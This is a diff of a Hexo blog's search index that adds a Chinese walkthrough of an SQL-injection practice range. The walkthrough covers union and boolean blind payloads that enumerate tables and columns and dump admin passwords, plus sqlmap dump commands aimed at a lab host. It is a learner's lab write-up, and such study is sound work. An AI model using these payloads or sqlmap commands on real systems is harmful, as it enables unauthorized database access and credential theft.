@@ -183,23 +183,6 @@
       </tags>
   </entry>
   <entry>
-    <title>第一篇博客</title>
-    <url>/2023/05/12/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<p>参照了杰克小麻雀所分享的经验而搭建的。</p>
-<blockquote>
-<p><a href="https://blog.csdn.net/yushuaigee/article/details/111465155">(112条消息) 从零开始免费搭建自己的博客(一)——本地搭建hexo框架_在k什么框架搭建博客_杰克小麻雀的博客-CSDN博客</a></p>
-</blockquote>
-<p>主题优化参照如下：</p>
-<p><a href="https://shen-yu.gitee.io/2019/ayer/#%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE">Ayer中文说明 | 岛 (gitee.io)</a></p>
-]]></content>
-      <categories>
-        <category>博客搭建及其优化</category>
-      </categories>
-      <tags>
-        <tag>博客经验来源</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hello World</title>
     <url>/2023/05/12/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -216,5 +199,86 @@
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>封神台靶场</title>
+    <url>/2023/05/15/%E5%B0%81%E7%A5%9E%E5%8F%B0/</url>
+    <content><![CDATA[<h2 id="一、女神小芳"><a href="#一、女神小芳" class="headerlink" title="一、女神小芳"></a>一、女神小芳</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515211214636.png" alt="image-20230515211214636"></p>
+<h3 id="1-注入位置判断"><a href="#1-注入位置判断" class="headerlink" title="1.注入位置判断"></a>1.注入位置判断</h3><p>id&#x3D;1,2,3时有不同页面，猜测id处可以注入</p>
+<h3 id="2-注入类型判断（判断错误）"><a href="#2-注入类型判断（判断错误）" class="headerlink" title="2.注入类型判断（判断错误）"></a>2.注入类型判断（判断错误）</h3><p>&#x3D;&#x3D;<strong>显然没有回显位，故不用联合注入</strong>&#x3D;&#x3D;</p>
+<p>&#x3D;&#x3D;1’、1”时页面不正常且不显示内容，故没有报错注入&#x3D;&#x3D;</p>
+<p>&#x3D;&#x3D;首先进行数字型注入&#x3D;&#x3D;</p>
+<p>&#x3D;&#x3D;<code>id=1 and 1=1 时页面正常</code>&#x3D;&#x3D;</p>
+<p>&#x3D;&#x3D;<code>id=1 and 1=2 时页面不正常</code>&#x3D;&#x3D;</p>
+<p>&#x3D;&#x3D;故数字型盲注。&#x3D;&#x3D;</p>
+<p>看了wp才发现，原来还是可以用联合注入的，想当然了，以为回显位(order by)只出现在有输入框的地方。</p>
+<h2 id="3-联合注入"><a href="#3-联合注入" class="headerlink" title="3.联合注入"></a>3.联合注入</h2><h3 id="1-order-by判断可显示列数"><a href="#1-order-by判断可显示列数" class="headerlink" title="1.order by判断可显示列数"></a>1.order by判断可显示列数</h3><p><code>id=1 order by 3内容为空 by 2为正常值</code></p>
+<p>故回显位2</p>
+<h2 id="2-union-select"><a href="#2-union-select" class="headerlink" title="2.union select"></a>2.union select</h2><p><code>?id=10000 union select 1,2#</code> id&#x3D;-1这种不行，被处理过了</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515235328914.png" alt="image-20230515235328914"></p>
+<p>2改为database()，显示maoshe</p>
+<h3 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h3><p>?id&#x3D;10000 union select 1,(select group_concat(’~‘,table_name) from information_schema.tables where table_schema&#x3D;database())#</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515235921469.png" alt="image-20230515235921469"></p>
+<h3 id="4-爆列名"><a href="#4-爆列名" class="headerlink" title="4.爆列名"></a>4.爆列名</h3><p>?id&#x3D;10000%20union%20select%201,(select%20group_concat(%27~%27,column_name)%20from%20information_schema.columns%20where%20table_schema&#x3D;database()%20and%20table_name&#x3D;%27admin%27)#</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516001033181.png" alt="image-20230516001033181"></p>
+<h3 id="5-爆列名值"><a href="#5-爆列名值" class="headerlink" title="5.爆列名值"></a>5.爆列名值</h3><p>?id&#x3D;10000%20union%20select%201,(select group_concat(‘~’,password) from admin)#</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516001159511.png" alt="image-20230516001159511"></p>
+<h2 id="盲注过程，算是复习吧qaq"><a href="#盲注过程，算是复习吧qaq" class="headerlink" title="盲注过程，算是复习吧qaq"></a>盲注过程，算是复习吧qaq</h2><h3 id="3-数据库长度判断"><a href="#3-数据库长度判断" class="headerlink" title="3.数据库长度判断"></a>3.数据库长度判断</h3><p><code>id=1%20and%20length(database())&gt;5 时正常，&gt;6时不正常</code></p>
+<p>故database()长度为6</p>
+<h3 id="4-数据库爆破"><a href="#4-数据库爆破" class="headerlink" title="4.数据库爆破"></a>4.数据库爆破</h3><p><code>id=1 and ascii(substr(database(),&#123;1&#125;,1)) &gt; &#123;1&#125; #判断第一个字母</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515215548482.png" alt="image-20230515215548482"></p>
+<p>数据库名maoshe</p>
+<h3 id="5-表名长度判断"><a href="#5-表名长度判断" class="headerlink" title="5.表名长度判断"></a>5.表名长度判断</h3><p><code>id=1 and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;4正常，&gt;5时不正常</code></p>
+<p>故第一个表名长度5 </p>
+<h3 id="6-表名爆破"><a href="#6-表名爆破" class="headerlink" title="6.表名爆破"></a>6.表名爆破</h3><p><code>id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;maoshe&#39; limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;</code>#判断表名第一个字符</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515215706751.png" alt="image-20230515215706751"></p>
+<p>第一个表名admin</p>
+<p>第二个表名dirs</p>
+<p>第三个表名news</p>
+<p>第四个表名xss</p>
+<h3 id="7-列名长度判断"><a href="#7-列名长度判断" class="headerlink" title="7.列名长度判断"></a>7.列名长度判断</h3><p>id &#x3D;1 and (select length(column_name) from information_schema. columns where table_name &#x3D; ‘admin’ and table_schema &#x3D; ‘maoshe’  limit  0,1)&gt;1 &#x2F;&#x2F;列名</p>
+<h3 id="8-列名判断"><a href="#8-列名判断" class="headerlink" title="8.列名判断"></a>8.列名判断</h3><p><code>id =1 and ascii(substr((select column_name from information_schema.columns where table_name = &#39;admin&#39; and table_schema = &#39;maoshe&#39; limit  0,1),&#123;0&#125;,1))&gt;&#123;1&#125; //列名</code></p>
+<p>admin表的列名Id、username、passwGrd</p>
+<p>dirs表的列名paths</p>
+<p>news表的列名id、content</p>
+<p>xss表的列名id、user、pass</p>
+<h3 id="9-爆值"><a href="#9-爆值" class="headerlink" title="9.爆值"></a>9.爆值</h3><p>看下xss的pass字段吧</p>
+<p><code>id=1 and ascii(substr((select &#39;pass&#39; from &#39;xss&#39; limit  0,1),&#123;0&#125;,1))&gt;&#123;1&#125;</code></p>
+<p>嘶，没跑出来flag的字样的，哪里漏掉了</p>
+<h3 id="10-sqlmap"><a href="#10-sqlmap" class="headerlink" title="10.sqlmap"></a>10.sqlmap</h3><p>用sqlmap解决吧。</p>
+<blockquote>
+<p>python sqlmap.py -u “<a href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“ –dbs</p>
+<p>跑出了maoshe、test、information_schema</p>
+<p>python sqlmap.py -u “<a href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“  -D maoshe –tables</p>
+<p>表名没问题</p>
+<p>python sqlmap.py -u “<a href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“  -D maoshe -T admin –columns –dump</p>
+<p>emm，admin表中的列是password，脚本还跑错了。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>靶场演练</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>靶场</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第一篇博客</title>
+    <url>/2023/05/12/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<p>参照了杰克小麻雀所分享的经验而搭建的。</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/yushuaigee/article/details/111465155">(112条消息) 从零开始免费搭建自己的博客(一)——本地搭建hexo框架_在k什么框架搭建博客_杰克小麻雀的博客-CSDN博客</a></p>
+</blockquote>
+<p>主题优化参照如下：</p>
+<p><a href="https://shen-yu.gitee.io/2019/ayer/#%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE">Ayer中文说明 | 岛 (gitee.io)</a></p>
+]]></content>
+      <categories>
+        <category>博客搭建及其优化</category>
+      </categories>
+      <tags>
+        <tag>博客经验来源</tag>
+      </tags>
   </entry>
 </search>
